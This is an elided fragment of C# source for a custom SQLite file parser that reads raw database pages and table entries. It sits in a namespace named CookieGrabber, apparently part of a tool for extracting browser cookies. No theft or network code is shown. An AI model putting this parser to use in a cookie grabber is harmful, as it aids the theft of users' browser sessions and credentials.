...
namespace CookieGrabber
{
    internal class SQLite
    {
        ...
        public byte[] GetValue(int rowNum, int field)
        {
            try
            {
        ...
        bool check(byte[] value, int awailableSize)
        {
            if (value == null || value.Length == 0 || (awailableSize != -1 && value.Length != awailableSize))
                return false;
            return true;
        }

        byte[] reverseArray(byte[] arr, int start = 0, int end = -1)
        {
            int len = end - start;
            if (end == -1) len = end = arr.Length;
        ...
        public string GetString(int rowNum, int field)
        {
            return Encoding.GetString(GetValue(rowNum, field));
        }

        public long GetLong(int rowNum, int field)
        {
            var bytes = reverseArray(GetValue(rowNum, field));
            if (check(bytes, 8))
        ...
        public ulong GetULong(int rowNum, int field)
        {
            var bytes = reverseArray(GetValue(rowNum, field));
            if (check(bytes, 8))
        ...
        public int GetInt(int rowNum, int field)
        {
            var bytes = reverseArray(GetValue(rowNum, field));
            if (check(bytes, 4))
        ...
        public uint GetUInt(int rowNum, int field)
        {
            var bytes = reverseArray(GetValue(rowNum, field));
            if (check(bytes, 4))
        ...
        public bool GetBool(int rowNum, int field)
        {
            var bytes = reverseArray(GetValue(rowNum, field));
            if (check(bytes, 1))
            ...
            try
            {
                if (_fileBytes[offset] == 13)
                {
                    ...
                    for (uint index1 = 0; (int)index1 <= (int)num1; ++index1)
                    {
                        ...
                        if (array != null)
                        {
                            _tableEntries[num2 + (int)index1].Content = new byte[array.Length][];
                            int num7 = 0;
                            for (int index3 = 0; index3 <= array.Length - 1; ++index3)
                            {
                                ...
                                //}
                                //else
                                //_tableEntries[num2 + (int)index1].Content[index3] = Encoding.UTF8.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                //}
                                //else
                                if (array[index3].Type == 8)
                                    _tableEntries[num2 + (int)index1].Content[index3] = new byte[]{ 0 };
                                else if (array[index3].Type == 9)
                                    _tableEntries[num2 + (int)index1].Content[index3] = new byte[] { 1 };
                                else
                                    _tableEntries[num2 + (int)index1].Content[index3] = Select(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
        ...
        private static byte[] Select(byte[] arr, int index, int count)
        {
                    ...
                    case 13:
                        ...
                        for (ulong index1 = 0; index1 <= num3; ++index1)
                        {
                            ...
                            if (Encoding == Encoding.UTF8 || Encoding == Encoding.Unicode)
                                ...
                                _masterTableEntries[num4 + (int)index1].ItemName = Encoding.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
                            ...
                            _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
                        }
                        break;
                }
            }
